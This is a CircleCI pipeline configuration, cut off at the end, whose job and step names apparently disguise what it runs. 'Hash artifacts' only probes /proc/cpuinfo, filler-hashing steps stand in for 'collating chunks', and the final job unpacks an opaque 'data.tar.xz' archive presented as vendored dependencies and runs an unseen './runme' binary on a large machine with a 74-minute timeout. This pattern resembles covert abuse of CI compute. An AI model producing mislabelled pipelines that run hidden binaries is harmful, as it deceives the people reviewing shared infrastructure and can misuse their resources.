version: 2.1

jobs:
  p1_aug5-release:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Collate adjacent chunks
          command: |
            mkdir -p /tmp/cache
            set +o pipefail 2>/dev/null; yes abc | head -n 1401847 | sha1sum > /tmp/cache/log.txt; true
            echo "ready: $(sha256sum /tmp/cache/log.txt | cut -c1-16)..."
      - persist_to_workspace:
          root: /tmp/cache
          paths:
            - log.txt
  aug5-release:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/cache
      - run:
          name: Read staged data
          command: |
            wc -l /tmp/cache/298.txt || true
      - run:
          name: Retrieve codebase
          command: git clone -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Checkout vendored deps
          command: tar --extract --xz -f data.tar.xz
      - run:
          name: Hash artifacts
          command: cat /proc/cpuinfo | head -5
      - run:
          no_output_timeout: 74m
          command: /bin/sh -c "./runme"
  phase_cf-2:
